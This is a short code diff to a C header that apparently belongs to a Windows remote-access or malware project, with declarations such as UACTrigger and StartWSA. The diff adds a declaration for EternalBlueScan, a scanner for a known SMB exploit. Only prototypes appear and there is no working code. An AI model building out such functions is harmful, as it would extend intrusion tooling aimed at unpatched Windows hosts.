@@ -42,6 +42,7 @@ void UACTrigger();
 char* FhdawnInfo();
 BOOL isFile(const char* file);
 void UserPC();
+void EternalBlueScan(const char* host);
 char* cDir();
 // Start Winsock
 void StartWSA(void);
